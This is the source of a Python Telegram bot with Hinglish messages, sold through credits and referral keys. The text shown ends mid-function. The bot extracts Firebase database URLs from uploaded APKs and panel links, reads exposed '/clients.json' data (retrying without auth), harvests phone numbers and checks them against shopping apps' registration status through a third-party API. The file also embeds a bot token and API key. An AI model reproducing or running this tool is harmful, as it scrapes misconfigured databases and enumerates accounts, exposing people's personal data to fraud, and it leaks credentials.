import json
import os
import re
import time
import base64
import zipfile
import tempfile
import random
import string
import requests
from flask import Flask
import threading
import functools
from datetime import datetime, timedelta

try:
    import sys
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

print = functools.partial(print, flush=True)

# ================= APNA CONFIG YAHAN SET HAI =================
BOT_TOKEN = "8632363521:AAHmUpYvXtViGysiVRkhXiII_2SxcBnorIw"
ADMIN_CHAT_ID = "6755426755"
CHANNEL_USERNAME = "@trickzone6"  # Aapka channel username[cite: 1]

# Tubesave API Config
TUBESAVE_API_URL = "https://tubesave.in/api/v1/check"
TUBESAVE_SERVICES_URL = "https://tubesave.in/api/v1/services"
TUBESAVE_API_KEY = "AK_LUsM52Te1lyvxLmv5uT8HepjuHvBxKFx"

TIMEOUT = 10
USERS_FILE = "bot_users.json"
CREDITS_FILE = "user_credits.json"
KEYS_FILE = "redeem_keys.json"
# ==============================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "Firebase Extractor & Manual Number Checker Bot is active!"

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

def self_ping():
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:10000")
    while True:
        try:
            requests.get(render_url, timeout=10)
        except Exception:
            pass
        time.sleep(300)

def load_json(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f:
                return json.load(f)
        except:
            pass
    return {}

def save_json(filename, data):
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                return set(json.load(f))
        except:
            pass
    return set()

def save_user(chat_id):
    users = load_users()
    if str(chat_id) not in users:
        users.add(str(chat_id))
        save_json(USERS_FILE, list(users))

def check_user_channel(session, token, chat_id):
    if str(chat_id) == str(ADMIN_CHAT_ID):
        return True
    try:
        url = f"https://api.telegram.org/bot{token}/getChatMember?chat_id={CHANNEL_USERNAME}&user_id={chat_id}"
        res = session.get(url, timeout=10).json()
        if res.get("ok"):
            status = res["result"].get("status")
            if status in ["member", "administrator", "creator"]:
                return True
    except Exception as e:
        print(f"Channel Check Error: {e}")
    return False

def get_user_data(chat_id):
    data = load_json(CREDITS_FILE)
    uid = str(chat_id)
    if uid not in data:
        data[uid] = {
            "credits": 5,
            "sub_expiry": None,
            "referred_by": None,
            "ref_rewarded": False,
            "left_channel_penalty": False,
            "pending_firebase": None,
            "selected_service": None,
            "waiting_for_single_check": False
        }
        save_json(CREDITS_FILE, data)
    return data[uid]

def update_user_data(chat_id, user_data):
    data = load_json(CREDITS_FILE)
    data[str(chat_id)] = user_data
    save_json(CREDITS_FILE, data)

def has_active_sub(chat_id):
    if str(chat_id) == str(ADMIN_CHAT_ID):
        return True
    u_data = get_user_data(chat_id)
    expiry = u_data.get("sub_expiry")
    if expiry:
        try:
            exp_time = datetime.fromisoformat(expiry)
            if datetime.now() < exp_time:
                return True
        except:
            pass
    return False

def send_keyboard_message(session, token, chat_id, text, inline_keyboard):
    try:
        r = session.post(f"https://api.telegram.org/bot{token}/sendMessage",
                         json={
                             "chat_id": chat_id,
                             "text": text,
                             "reply_markup": {"inline_keyboard": inline_keyboard},
                             "parse_mode": "Markdown"
                         }, timeout=15)
        return r.status_code == 200
    except Exception:
        return False

def answer_callback(session, token, callback_query_id, text=""):
    try:
        session.post(f"https://api.telegram.org/bot{token}/answerCallbackQuery",
                     json={"callback_query_id": callback_query_id, "text": text}, timeout=10)
    except Exception:
        pass

# --- UNIVERSAL LINK & QUERY PARSER ---
def parse_links_bulk(text):
    lines = text.strip().split('\n')
    parsed_results = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        
        param_matches = re.findall(r'[?&][a-zA-Z0-9_-]+=([A-Za-z0-9+/=_-]+)', line)
        decoded_texts = [line]
        for match in param_matches:
            try:
                raw = match.replace('-', '+').replace('_', '/')
                raw += '=' * (-len(raw) % 4)
                decoded_bytes = base64.b64decode(raw)
                decoded = decoded_bytes.decode('utf-8', errors='ignore')
                decoded_texts.append(decoded)
                
                if not decoded.startswith(('{', '[', 'http')) and re.match(r'^[A-Za-z0-9+/=]+$', decoded.strip()):
                    try:
                        d2 = base64.b64decode(decoded.strip()).decode('utf-8', errors='ignore')
                        decoded_texts.append(d2)
                    except:
                        pass
            except:
                pass

        found_any = False
        for text_block in decoded_texts:
            try:
                data = json.loads(text_block)
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict):
                            p_url = item.get('url', '').rstrip('/')
                            p_key = item.get('key', 'dummy') or "dummy"
                            if p_url:
                                if not p_url.startswith("http"):
                                    p_url = "https://" + p_url
                                pm = re.search(r'https://([^.]+)', p_url)
                                p_name = pm.group(1) if pm else "unknown"
                                if (p_url, p_key, p_name) not in parsed_results:
                                    parsed_results.append((p_url, p_key, p_name))
                                    found_any = True
                    continue
                elif isinstance(data, dict):
                    p_url = data.get('url', '').rstrip('/')
                    p_key = data.get('key', 'dummy') or "dummy"
                    if p_url:
                        if not p_url.startswith("http"):
                            p_url = "https://" + p_url
                        pm = re.search(r'https://([^.]+)', p_url)
                        p_name = pm.group(1) if pm else "unknown"
                        if (p_url, p_key, p_name) not in parsed_results:
                            parsed_results.append((p_url, p_key, p_name))
                            found_any = True
                        continue
            except:
                pass

            urls = re.findall(r'https?://[a-zA-Z0-9.-]+\.firebaseio\.com|https?://[a-zA-Z0-9.-]+\.firebasedatabase\.app', text_block)
            for u in urls:
                u_clean = u.rstrip('/')
                pm = re.search(r'https://([^.]+)', u_clean)
                p_name = pm.group(1) if pm else "unknown"
                if (u_clean, "dummy", p_name) not in parsed_results:
                    parsed_results.append((u_clean, "dummy", p_name))
                    found_any = True

        if found_any:
            continue

        if '||' in line:
            parts = re.split(r'\|{2,}', line)
            url = parts[0].strip()
            key = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "dummy"
            if url:
                url = url.rstrip('/')
                if not url.startswith("http"):
                    url = "https://" + url
                pm = re.search(r'https://([^.]+)', url)
                p_name = pm.group(1) if pm else "unknown"
                parsed_results.append((url, key, p_name))
                continue

        if "firebaseio.com" in line or "firebasedatabase.app" in line or line.startswith("http"):
            url = line.rstrip('/')
            pm = re.search(r'https://([^.]+)', url)
            p_name = pm.group(1) if pm else "unknown"
            parsed_results.append((url, "dummy", p_name))

    return parsed_results

def extract_firebase_from_apk(apk_path):
    extracted_urls = []
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            for filename in z.namelist():
                if any(ext in filename.lower() for ext in ['.dex', '.json', '.xml', '.txt', '.so', 'res/', 'assets/']):
                    try:
                        content = z.read(filename)
                        urls = re.findall(r'https?://[a-zA-Z0-9.-]+\.firebaseio\.com|https?://[a-zA-Z0-9.-]+\.firebasedatabase\.app', str(content))
                        for u in urls:
                            if u.strip('/') not in extracted_urls:
                                extracted_urls.append(u.strip('/'))
                                
                        project_matches = re.findall(r'([a-zA-Z0-9_-]+)-default-rtdb', str(content))
                        for p in project_matches:
                            constructed_url = f"https://{p}-default-rtdb.firebaseio.com"
                            if constructed_url not in extracted_urls:
                                extracted_urls.append(constructed_url)
                    except:
                        continue
    except Exception as e:
        print(f"Universal APK Parse Error: {e}")
    return extracted_urls

# --- DEEP RECURSIVE NUMBER EXTRACTOR FROM FIREBASE ---
def extract_numbers_recursive(data):
    all_nums = set()
    online_nums = set()
    
    def search(node):
        if isinstance(node, dict):
            # Check if this node represents a device/user entry
            is_online = bool(node.get("status") or node.get("online") or node.get("lastSeen"))
            for k, v in node.items():
                if isinstance(v, (str, int)):
                    val_str = str(v)
                    # Check if looks like phone number (10 to 15 digits)
                    clean_v = re.sub(r'\D', '', val_str)
                    if 10 <= len(clean_v) <= 15:
                        all_nums.add(clean_v)
                        if is_online:
                            online_nums.add(clean_v)
                search(v)
        elif isinstance(node, list):
            for item in node:
                search(item)
        elif isinstance(node, (str, int)):
            val_str = str(node)
            clean_v = re.sub(r'\D', '', val_str)
            if 10 <= len(clean_v) <= 15:
                all_nums.add(clean_v)

    search(data)
    return list(all_nums), list(online_nums)

def check_firebase_and_extract_numbers(url, key):
    clients_url = f"{url}/clients.json"
    if key and key != "dummy":
        clients_url += f"?auth={key}"
    try:
        res = requests.get(clients_url, timeout=TIMEOUT)
        if res.status_code == 200:
            data = res.json()
            if data:
                all_nums, online_nums = extract_numbers_recursive(data)
                # If specific keys like device IDs are numbers
                if isinstance(data, dict):
                    for d_id in data.keys():
                        clean_id = re.sub(r'\D', '', d_id)
                        if 10 <= len(clean_id) <= 15:
                            if clean_id not in all_nums:
                                all_nums.append(clean_id)
                return "live", all_nums, online_nums
        elif res.status_code == 401:
            if key and key != "dummy":
                try:
                    res2 = requests.get(f"{url}/clients.json", timeout=TIMEOUT)
                    if res2.status_code == 200:
                        data2 = res2.json()
                        if data2:
                            all_nums, online_nums = extract_numbers_recursive(data2)
                            return "live_no_auth", all_nums, online_nums
                except:
                    pass
            return "auth_error", [], []
        return f"http_{res.status_code}", [], []
    except Exception as e:
        return "error", [], []

def call_tubesave_api(service, phone):
    try:
        headers = {
            "X-API-Key": TUBESAVE_API_KEY,
            "Content-Type": "application/json"
        }
        payload = {
            "service": service,
            "phone": phone
        }
        res = requests.post(TUBESAVE_API_URL, headers=headers, json=payload, timeout=10)
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        print(f"Tubesave API Error: {e}")
    return None

def get_services_list():
    try:
        headers = {"X-API-Key": TUBESAVE_API_KEY}
        res = requests.get(TUBESAVE_SERVICES_URL, headers=headers, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, list):
                return data
            elif isinstance(data, dict) and "services" in data:
                return data["services"]
    except:
        pass
    return ["swiggy", "bigbasket", "meesho", "flipkart", "amazon", "blinkit", "ajio", "myjio", "lenskart", "myntra", "oyo"]

# --- TELEGRAM LISTENER ---
def telegram_listener(token, session):
    offset = 0
    print("[Bot] Listener with Manual Number Checker & Deep Extractor started.")
    waiting_for_panel = {}

    while True:
        try:
            r = session.get(f"https://api.telegram.org/bot{token}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
            if r.status_code == 200:
                data = r.json()
                if data.get("ok"):
                    for update in data.get("result", []):
                        offset = update["update_id"] + 1
                        
                        callback = update.get("callback_query")
                        if callback:
                            cq_id = callback.get("id")
                            chat_id = str(callback.get("message", {}).get("chat", {}).get("id"))
                            data_val = callback.get("data", "")
                            
                            if data_val == "check_sub":
                                if check_user_channel(session, token, chat_id):
                                    u_data = get_user_data(chat_id)
                                    if u_data.get("referred_by") and not u_data.get("ref_rewarded"):
                                        referrer_id = u_data["referred_by"]
                                        ref_data = get_user_data(referrer_id)
                                        ref_data["credits"] = ref_data.get("credits", 0) + 5
                                        update_user_data(referrer_id, ref_data)
                                        
                                        u_data["ref_rewarded"] = True
                                        u_data["left_channel_penalty"] = False
                                        update_user_data(chat_id, u_data)
                                        try:
                                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": referrer_id, "text": "🎁 Aapke referred user ne channel join verify kar liya hai! Aapko +5 Credits mil gaye hain."})
                                        except:
                                            pass
                                    
                                    answer_callback(session, token, cq_id, "✅ Verification Successful!")
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "🎉 Aapka channel join verified ho gaya hai! Ab aap bot use kar sakte hain. /start dabayein."})
                                else:
                                    answer_callback(session, token, cq_id, "❌ Aapne abhi tak channel join nahi kiya hai!")
                            elif data_val == "btn_profile":
                                answer_callback(session, token, cq_id)
                                u_data = get_user_data(chat_id)
                                credits = u_data.get("credits", 0)
                                sub_status = "Active 🟢" if has_active_sub(chat_id) else "Inactive 🔴"
                                bot_info = session.get(f"https://api.telegram.org/bot{token}/getMe").json()
                                b_username = bot_info.get("result", {}).get("username", "bot")
                                ref_link = f"https://t.me/{b_username}?start=ref_{chat_id}"
                                
                                profile_text = (
                                    f"👤 **Your Profile:**\n\n"
                                    f"💰 Credits: `{credits}`\n"
                                    f"👑 Unlimited Access Pass: `{sub_status}`\n\n"
                                    f"🔗 **Referral Link:**\n`{ref_link}`\n\n"
                                    f"💡 *Har verified invite par +5 Credits! 10 Credits = 3 Days Unlimited Access.*"
                                )
                                keyboard = [[{"text": "🎁 Buy 3-Day Pass (10 Credits)", "callback_data": "buy_sub"}]]
                                send_keyboard_message(session, token, chat_id, profile_text, keyboard)
                            elif data_val == "buy_sub":
                                u_data = get_user_data(chat_id)
                                if u_data.get("credits", 0) >= 10:
                                    u_data["credits"] -= 10
                                    expiry = datetime.now() + timedelta(days=3)
                                    u_data["sub_expiry"] = expiry.isoformat()
                                    update_user_data(chat_id, u_data)
                                    answer_callback(session, token, cq_id, "Success!")
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "🎉 Badhai ho! Aapko 3 din ka unlimited access mil gaya hai!"})
                                else:
                                    answer_callback(session, token, cq_id, "Insufficient Credits!")
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Aapke paas kam credits hain. Dosto ko invite karke credits kamayein!"})
                            elif data_val == "btn_web_panel":
                                answer_callback(session, token, cq_id, "Web Panel mode activated!")
                                waiting_for_panel[chat_id] = True
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "🌐 Kripya apna **Web Panel Link(s)** ya text yahan bhejiye:"})
                            elif data_val == "btn_number_checker":
                                answer_callback(session, token, cq_id, "Number Checker activated!")
                                services = get_services_list()
                                app_keyboard = []
                                row = []
                                for s in services:
                                    row.append({"text": s.capitalize(), "callback_data": f"single_chk_app_{s}"})
                                    if len(row) == 2:
                                        app_keyboard.append(row)
                                        row = []
                                if row:
                                    app_keyboard.append(row)
                                send_keyboard_message(session, token, chat_id, "🔍 **Free Number Checker**\n\nKripya app chuniye jiska status check karna hai:", app_keyboard)
                            
                            # --- MANUAL NUMBER CHECKER APP SELECTION ---
                            elif data_val.startswith("single_chk_app_"):
                                app_name = data_val.replace("single_chk_app_", "")
                                u_data = get_user_data(chat_id)
                                u_data["selected_service"] = app_name
                                u_data["waiting_for_single_check"] = True
                                update_user_data(chat_id, u_data)
                                answer_callback(session, token, cq_id, f"Selected: {app_name.upper()}")
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"📱 Aapne **{app_name.upper()}** select kiya hai.\n\nAb kripya apna **Mobile Number** bhejien (jaise `9876543210`):"})

                            # --- FIREBASE BULK CHECKER APP SELECTION ---
                            elif data_val.startswith("chk_app_"):
                                app_name = data_val.replace("chk_app_", "")
                                u_data = get_user_data(chat_id)
                                u_data["selected_service"] = app_name
                                update_user_data(chat_id, u_data)
                                answer_callback(session, token, cq_id, f"Selected: {app_name.upper()}")
                                
                                mode_kb = [
                                    [
                                        {"text": "🟢 Sirf Online Numbers", "callback_data": "chk_mode_online"},
                                        {"text": "🔄 Online + Offline Dono", "callback_data": "chk_mode_all"}
                                    ]
                                ]
                                send_keyboard_message(session, token, chat_id, f"🎯 App: **{app_name.upper()}** select ho gaya hai!\n\nKripya mode chuniye ki kis tarah ke numbers check karne hain:", mode_kb)
                            
                            elif data_val.startswith("chk_mode_"):
                                mode = data_val.replace("chk_mode_", "")
                                answer_callback(session, token, cq_id, "Processing check...")
                                u_data = get_user_data(chat_id)
                                app_name = u_data.get("selected_service", "swiggy")
                                numbers = u_data.get("pending_firebase", {"online": [], "all": []})
                                
                                target_list = numbers["online"] if mode == "online" else numbers["all"]
                                if not target_list:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Is database mein is mode ke hisab se koi valid numbers nahi mile!"})
                                    continue
                                
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🚀 **{app_name.upper()}** checker started! Total `{len(target_list)}` numbers par request bhej rahe hain..."})
                                
                                registered_count = 0
                                report_lines = [f"📊 **Result Report ({app_name.upper()}):**\n"]
                                
                                for num in target_list[:10]:
                                    res = call_tubesave_api(app_name, num)
                                    if res and res.get("registered"):
                                        registered_count += 1
                                        report_lines.append(f"✅ `+{num}` — **Registered**")
                                    else:
                                        report_lines.append(f"❌ `+{num}` — Not Registered")
                                    time.sleep(5)
                                
                                report_lines.append(f"\n🎯 Total Checked: {min(len(target_list), 10)} | Registered: {registered_count}")
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "\n".join(report_lines), "parse_mode": "Markdown"})
                            continue

                        message = update.get("message")
                        if not message:
                            continue
                        
                        chat_id = str(message.get("chat", {}).get("id"))
                        user_info = message.get("from", {})
                        username = user_info.get("username", "Unknown")
                        first_name = user_info.get("first_name", "User")
                        text = message.get("text", "").strip()
                        document = message.get("document")

                        save_user(chat_id)

                        # --- STRICT FORCE JOIN & LEAVE CHECK ---
                        if not check_user_channel(session, token, chat_id):
                            join_text = (
                                "🚨 **Access Denied!**\n\n"
                                f"Bot ko use karne ke liye hamare official channel ko join karna zaroori hai[cite: 1]:\n\n"
                                f"👉 {CHANNEL_USERNAME}\n\n"
                                "Aapne channel chhod diya hai ya join nahi kiya hai. Pehle join karke **'Verify Membership'** par click karein."
                            )
                            keyboard = [
                                [{"text": "📢 Join Channel", "url": f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"}],
                                [{"text": "✅ Verify Membership", "callback_data": "check_sub"}]
                            ]
                            send_keyboard_message(session, token, chat_id, join_text, keyboard)
                            continue

                        # --- REFERRAL PENALTY CHECK ---
                        u_data = get_user_data(chat_id)
                        if chat_id != str(ADMIN_CHAT_ID) and u_data.get("ref_rewarded") and not u_data.get("left_channel_penalty", False):
                            if not check_user_channel(session, token, chat_id):
                                referrer_id = u_data.get("referred_by")
                                if referrer_id:
                                    ref_data = get_user_data(referrer_id)
                                    ref_data["credits"] = max(0, ref_data.get("credits", 0) - 5)
                                    update_user_data(referrer_id, ref_data)
                                    try:
                                        session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": referrer_id, "text": "⚠️ Aapke ek referred user ne channel leave kar diya hai, isliye aapke 5 credits minus ho gaye hain."})
                                    except:
                                        pass
                                u_data["left_channel_penalty"] = True
                                update_user_data(chat_id, u_data)

                        # --- HANDLE MANUAL NUMBER CHECK INPUT ---
                        if u_data.get("waiting_for_single_check"):
                            u_data["waiting_for_single_check"] = False
                            update_user_data(chat_id, u_data)
                            
                            clean_num = re.sub(r'\D', '', text)
                            if len(clean_num) < 10:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Invalid number format! Kripya sahi 10-digit number bhejien."})
                                continue
                            
                            app_name = u_data.get("selected_service", "swiggy")
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔍 `{clean_num}` ko **{app_name.upper()}** par check kiya ja raha hai..."})
                            
                            res = call_tubesave_api(app_name, clean_num)
                            if res and res.get("registered"):
                                reply_text = f"✅ **Result:** Number `+{clean_num}` **{app_name.upper()}** par **REGISTERED** hai!"
                            else:
                                reply_text = f"❌ **Result:** Number `+{clean_num}` **{app_name.upper()}** par registered nahi hai."
                            
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                            continue

                        if text == "/rules":
                            rules_text = (
                                "📜 **Referral Rules & Guidelines:**\n\n"
                                f"1️⃣ Jab aap apne referral link se kisi ko invite karte hain, toh jab tak woh user `{CHANNEL_USERNAME}` channel join karke verify nahi karega, tab tak valid refer nahi mana jayega[cite: 1].\n"
                                "2️⃣ Har ek verified invite par aapko **+5 Credits** milte hain.\n"
                                "3️⃣ Agar invited user channel leave kar deta hai, toh referrer ke credits mein se **-5 credits** (penalty) cut ho jayenge.\n"
                                "4️⃣ Bot use karne ke liye channel join rehna anivarya hai."
                            )
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": rules_text, "parse_mode": "Markdown"})
                            continue

                        if text == "/about":
                            about_text = (
                                "ℹ️ **About Bot:**\n\n"
                                "Yeh bot Firebase database extraction aur **Free Number Checker** (Tubesave API powered) ki suvidha deta hai!\n\n"
                                "🛠 **Features:**\n"
                                "• **Number Checker:** Free mein manual number ya firebase numbers check karein.\n"
                                "• **Firebase Extractor:** Panel links ya APKs se data nikalne ke liye active subscription zaroori hai."
                            )
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": about_text, "parse_mode": "Markdown"})
                            continue

                        if text.startswith("/addsub"):
                            if chat_id == str(ADMIN_CHAT_ID):
                                parts = text.split(" ")
                                if len(parts) >= 3 and parts[1].isdigit() and parts[2].isdigit():
                                    target_id = parts[1]
                                    days = int(parts[2])
                                    target_u_data = get_user_data(target_id)
                                    expiry = datetime.now() + timedelta(days=days)
                                    target_u_data["sub_expiry"] = expiry.isoformat()
                                    update_user_data(target_id, target_u_data)
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"✅ User `{target_id}` ko `{days} din` ka unlimited access de diya gaya hai.", "parse_mode": "Markdown"})
                                    try:
                                        session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": target_id, "text": f"🎉 Admin ne aapko `{days} din` ka unlimited access pass de diya hai!"})
                                    except:
                                        pass
                                else:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Sahi format use karein: `/addsub <chat_id> <days>`", "parse_mode": "Markdown"})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Yeh command sirf Admin ke liye hai."})
                            continue

                        if text.startswith("/removesub"):
                            if chat_id == str(ADMIN_CHAT_ID):
                                parts = text.split(" ")
                                if len(parts) >= 2 and parts[1].isdigit():
                                    target_id = parts[1]
                                    target_u_data = get_user_data(target_id)
                                    target_u_data["sub_expiry"] = None
                                    update_user_data(target_id, target_u_data)
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"✅ User `{target_id}` ka subscription hata diya gaya hai.", "parse_mode": "Markdown"})
                                    try:
                                        session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": target_id, "text": "⚠️ Admin ne aapka unlimited subscription hata diya hai."})
                                    except:
                                        pass
                                else:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Sahi format use karein: `/removesub <chat_id>`", "parse_mode": "Markdown"})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Yeh command sirf Admin ke liye hai."})
                            continue

                        if text.startswith("/genkey"):
                            if chat_id == str(ADMIN_CHAT_ID):
                                parts = text.split(" ")
                                days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 3
                                random_key = "ZAIBCREATE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
                                
                                keys_data = load_json(KEYS_FILE)
                                keys_data[random_key] = days
                                save_json(KEYS_FILE, keys_data)
                                
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔑 **New Redeem Key Generated:**\n`{random_key}`\n⏳ Validity: `{days} Days`", "parse_mode": "Markdown"})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Yeh command sirf Admin ke liye hai."})
                            continue

                        if text.startswith("/redeem"):
                            parts = text.split(" ")
                            if len(parts) > 1:
                                input_key = parts[1].strip()
                                keys_data = load_json(KEYS_FILE)
                                if input_key in keys_data:
                                    days = keys_data[input_key]
                                    del keys_data[input_key]
                                    save_json(KEYS_FILE, keys_data)
                                    
                                    target_u_data = get_user_data(chat_id)
                                    current_expiry = target_u_data.get("sub_expiry")
                                    base_time = datetime.now()
                                    if current_expiry:
                                        try:
                                            exp_dt = datetime.fromisoformat(current_expiry)
                                            if exp_dt > base_time:
                                                base_time = exp_dt
                                        except:
                                            pass
                                    new_expiry = base_time + timedelta(days=days)
                                    target_u_data["sub_expiry"] = new_expiry.isoformat()
                                    update_user_data(chat_id, target_u_data)
                                    
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🎉 **Redeem Successful!**\nAapko `{days} Din` ka unlimited access mil gaya hai!", "parse_mode": "Markdown"})
                                else:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Invalid ya expired key!"})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Kripya key bhi likhein. Jaise: `/redeem ZAIBCREATE-XXXX`", "parse_mode": "Markdown"})
                            continue

                        if text.startswith("/start"):
                            parts = text.split(" ")
                            if len(parts) > 1 and parts[1].startswith("ref_"):
                                referrer_id = parts[1].replace("ref_", "")
                                if referrer_id != chat_id:
                                    target_u_data = get_user_data(chat_id)
                                    if not target_u_data.get("referred_by"):
                                        target_u_data["referred_by"] = referrer_id
                                        update_user_data(chat_id, target_u_data)

                            welcome_text = (
                                "⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n"
                                "🔥   **FIREBASE & TUBESAVE BOT**   🔥\n"
                                "⚡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n"
                                f"👋  Welcome, {first_name}!\n\n"
                                "✦ ─────────────────────────── ✦\n\n"
                                "/profile  — Check Credits & Pass\n"
                                "/redeem   — Redeem Pass Key\n"
                                "/rules    — Referral Rules\n"
                                "/about    — About Bot\n"
                                "✦ ─────────────────────────── ✦"
                            )
                            keyboard = [
                                [{"text": "👤 Profile & Referrals", "callback_data": "btn_profile"}],
                                [{"text": "🔍 Free Number Checker", "callback_data": "btn_number_checker"}],
                                [{"text": "🌐 Extract from Web Panel (Sub Req)", "callback_data": "btn_web_panel"}]
                            ]
                            send_keyboard_message(session, token, chat_id, welcome_text, keyboard)
                            continue

                        if text.startswith("/broadcast") or text.startswith("/bc"):
                            if chat_id == str(ADMIN_CHAT_ID):
                                bc_msg = text.replace("/broadcast", "").replace("/bc", "").strip()
                                if not bc_msg:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Kripya broadcast message likhein.", "parse_mode": "Markdown"})
                                    continue
                                users = load_users()
                                success_count, fail_count = 0, 0
                                for uid in users:
                                    try:
                                        res = session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": uid, "text": f"📢 **Announcement:**\n\n{bc_msg}", "parse_mode": "Markdown"}, timeout=10)
                                        if res.status_code == 200: success_count += 1
                                        else: fail_count += 1
                                    except: fail_count += 1
                                    time.sleep(0.1)
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"✅ **Broadcast Complete!**\n🟢 Success: {success_count}\n🔴 Failed: {fail_count}"})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Unauthorized."})
                            continue

                        if text == "/profile":
                            u_data = get_user_data(chat_id)
                            credits = u_data.get("credits", 0)
                            sub_status = "Active 🟢" if has_active_sub(chat_id) else "Inactive 🔴"
                            bot_info = session.get(f"https://api.telegram.org/bot{token}/getMe").json()
                            b_username = bot_info.get("result", {}).get("username", "bot")
                            ref_link = f"https://t.me/{b_username}?start=ref_{chat_id}"
                            
                            profile_text = (
                                f"👤 **Your Profile:**\n\n"
                                f"💰 Credits: `{credits}`\n"
                                f"👑 Unlimited Access Pass: `{sub_status}`\n\n"
                                f"🔗 **Referral Link:**\n`{ref_link}`\n\n"
                                f"💡 *Har verified invite par +5 Credits! 10 Credits = 3 Days Unlimited Access.*"
                            )
                            keyboard = [[{"text": "🎁 Buy 3-Day Pass (10 Credits)", "callback_data": "buy_sub"}]]
                            send_keyboard_message(session, token, chat_id, profile_text, keyboard)
                            continue

                        if text == "/help":
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "💡 Commands:\n/start - Start Bot\n/profile - Check Credits/Pass\n/rules - Referral Rules\n/about - About Bot\n/redeem - Redeem Key"})
                        elif text == "/stats":
                            session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "📊 Bot Status: Online & Active."})
                        
                        # --- FIREBASE EXTRACTOR WORKFLOW (SUBSCRIPTION REQUIRED) ---
                        is_admin = (chat_id == str(ADMIN_CHAT_ID))
                        user_has_sub = has_active_sub(chat_id)

                        if document:
                            if not is_admin and not user_has_sub:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ **Access Denied!**\n\nFirebase extraction (APK scan) ke liye aapke paas **Active Unlimited Pass** hona zaroori hai.\n\n💡 Pass lene ke liye `/profile` check karein ya `/redeem <key>` use karein!"})
                                continue

                            file_name = document.get("file_name", "")
                            if file_name.endswith(".apk"):
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "📥 APK file mil gayi hai, deep scan ki ja rahi hai..."})
                                file_id = document.get("file_id")
                                
                                file_info = session.get(f"https://api.telegram.org/bot{token}/getFile?file_id={file_id}").json()
                                if file_info.get("ok"):
                                    file_path = file_info["result"]["file_path"]
                                    download_url = f"https://api.telegram.org/file/bot{token}/{file_path}"
                                    
                                    apk_data = session.get(download_url).content
                                    with tempfile.NamedTemporaryFile(delete=False, suffix=".apk") as tmp:
                                        tmp.write(apk_data)
                                        tmp_name = tmp.name
                                    
